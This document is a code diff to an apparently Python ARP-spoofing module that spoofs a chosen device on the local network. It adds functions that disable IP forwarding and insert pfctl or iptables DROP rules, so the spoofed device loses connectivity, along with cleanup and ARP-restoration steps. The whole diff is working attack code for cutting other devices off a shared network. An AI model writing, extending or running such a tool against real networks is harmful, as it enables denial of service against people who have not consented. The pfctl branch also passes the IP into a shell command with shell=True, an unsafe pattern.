@@ -38,6 +38,47 @@ def _get_mac_for_ip(ip: str) -> str:
     return None
 
 
+def _set_ip_forwarding(enable: bool):
+    """Enable or disable IP forwarding at the OS level."""
+    import subprocess
+    import platform
+
+    val = "1" if enable else "0"
+    try:
+        if platform.system() == "Darwin":  # macOS
+            subprocess.run(["sudo", "sysctl", "-w", f"net.inet.ip.forwarding={val}"], capture_output=True)
+        else:  # Linux
+            subprocess.run(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True)
+    except Exception as e:
+        print(f"⚠️ Failed to set ip_forwarding: {e}")
+
+
+def _manage_firewall_block(ip: str, block: bool):
+    """Add or remove firewall rules to drop traffic from target IP."""
+    import subprocess
+    import platform
+
+    try:
+        if platform.system() == "Darwin":  # macOS (using pfctl)
+            # Create a temporary anchor for our blocks
+            anchor_name = f"com.network.scanner.block.{ip.replace('.', '_')}"
+            if block:
+                # Add rule: block drop from <ip> to any
+                rule = f"block drop from {ip} to any"
+                cmd = f'echo "{rule}" | sudo pfctl -a {anchor_name} -f -'
+                subprocess.run(cmd, shell=True, capture_output=True)
+                subprocess.run(["sudo", "pfctl", "-e"], capture_output=True) # Ensure pf is enabled
+            else:
+                subprocess.run(["sudo", "pfctl", "-a", anchor_name, "-F", "all"], capture_output=True)
+        
+        else:  # Linux (using iptables)
+            action = "-A" if block else "-D"
+            cmd = ["sudo", "iptables", action, "FORWARD", "-s", ip, "-j", "DROP"]
+            subprocess.run(cmd, capture_output=True)
+    except Exception as e:
+        print(f"⚠️ Firewall management failed for {ip}: {e}")
+
+
 def _get_local_mac() -> str:
     """Get this machine's MAC address."""
     from scapy.all import get_if_hwaddr
@@ -109,14 +150,20 @@ def start_spoof(target_ip: str, target_mac: str) -> bool:
         if target_ip in _active_spoofs:
             return False  # Already being spoofed
 
+        # 1. Ensure IP Forwarding is OFF (prevents Mac from acting as a bridge)
+        _set_ip_forwarding(False)
+
+        # 2. Add Firewall Block (Kernel-level drop)
+        _manage_firewall_block(target_ip, True)
+
+        # 3. Resolve Gateway MAC
         gateway_ip = _get_gateway_ip()
-        
-        # 1. Resolve Gateway MAC
         gateway_mac = _get_mac_for_ip(gateway_ip)
         if not gateway_mac:
+            _manage_firewall_block(target_ip, False) # Cleanup if failed
             raise RuntimeError(f"Could not resolve gateway MAC for {gateway_ip}")
 
-        # 2. Resolve fresh Target MAC (handles MAC randomization on the same IP)
+        # 4. Resolve fresh Target MAC
         fresh_target_mac = _get_mac_for_ip(target_ip)
         actual_target_mac = fresh_target_mac if fresh_target_mac else target_mac
 
@@ -148,10 +195,17 @@ def stop_spoof(target_ip: str) -> bool:
     if entry is None:
         return False  # Not being spoofed
 
+    # 1. Stop the spoofing thread
     entry["stop"].set()
     entry["thread"].join(timeout=5)
 
+    # 2. Remove Firewall Block
+    _manage_firewall_block(target_ip, False)
+
+    # 3. Restore ARP table for both target and gateway
     _restore_arp(target_ip, entry["mac"], entry["gateway_ip"], entry["gateway_mac"])
+    
+    print(f"🛑 ARP spoofing stopped and restored: {target_ip}")
     return True
 
 
